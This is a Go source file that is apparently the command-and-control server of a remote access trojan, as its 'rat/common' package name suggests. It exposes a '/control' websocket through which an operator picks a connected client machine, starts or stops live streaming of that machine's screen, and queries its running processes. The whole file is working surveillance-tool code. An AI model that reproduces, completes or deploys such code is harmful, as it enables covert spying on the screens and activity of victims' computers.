package main

import (
	"fmt"
	"net/http"
	"rat/common"
	"time"

	"encoding/json"

	"golang.org/x/net/websocket"
)

const (
	ScreenUpdateEvent = 0
	ProcessQueryEvent = 1
	MonitorQueryEvent = 2
)

type Event struct {
	Event    int    `json:"event"`
	ClientId int    `json:"id"`
	Data     string `json:"data"`
}

type ScreenEvent struct {
	Activate bool    `json:"active"`
	Scale    float32 `json:"scale"`
	Monitor  int     `json:"monitor"`
}

func newEvent(event int, clientID int, data string) *Event {
	return &Event{event, clientID, data}
}

func incomingWebSocket(ws *websocket.Conn) {
	defer func() {
		ws.Close()
	}()

	for {
		var event Event
		err := websocket.JSON.Receive(ws, &event)

		if err != nil {
			fmt.Println(err)
			return
		}

		if event.ClientId == 0 {
			continue
		}

		client := get(event.ClientId)

		if event.Event == ScreenUpdateEvent {
			var screenEvent ScreenEvent
			err := json.Unmarshal([]byte(event.Data), &screenEvent)

			if err != nil {
				fmt.Println("json:", err.Error(), event.Data)
			}

			stream := screenEvent.Activate

			if stream {
				json, err := json.Marshal(&client.Monitors)

				if err != nil {
					fmt.Println("json:", err)
				}

				event := newEvent(MonitorQueryEvent, client.Id, string(json))

				err = websocket.JSON.Send(ws, &event)

				if err != nil {
					fmt.Println("ws:", err)
				}
			}

			scale := screenEvent.Scale
			monitor := screenEvent.Monitor

			client.Listeners[common.MonitorsHeader] = ws

			packet := ScreenPacket{stream, scale, monitor}
			client.Queue <- packet

			if !client.Screen.Streaming {
				go ScreenStream(client, ws)
			}

			client.Screen.Streaming = stream
			defer func() {
				client.Screen.Streaming = false
			}()
		} else if event.Event == ProcessQueryEvent {
			client.Listeners[common.ProcessHeader] = ws
			client.Queue <- ProcessPacket{}
		}
	}
}

func InitControlSocket() {
	http.Handle("/control", websocket.Handler(incomingWebSocket))
}

// ScreenStream streams screen to websocket
func ScreenStream(client *Client, ws *websocket.Conn) {
	for client.Screen.Streaming {
		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())

		err := websocket.JSON.Send(ws, &event)

		if err != nil {
			fmt.Println("screenstream:", err.Error())
			return
		}

		time.Sleep(common.ScreenStreamWait)
	}
}
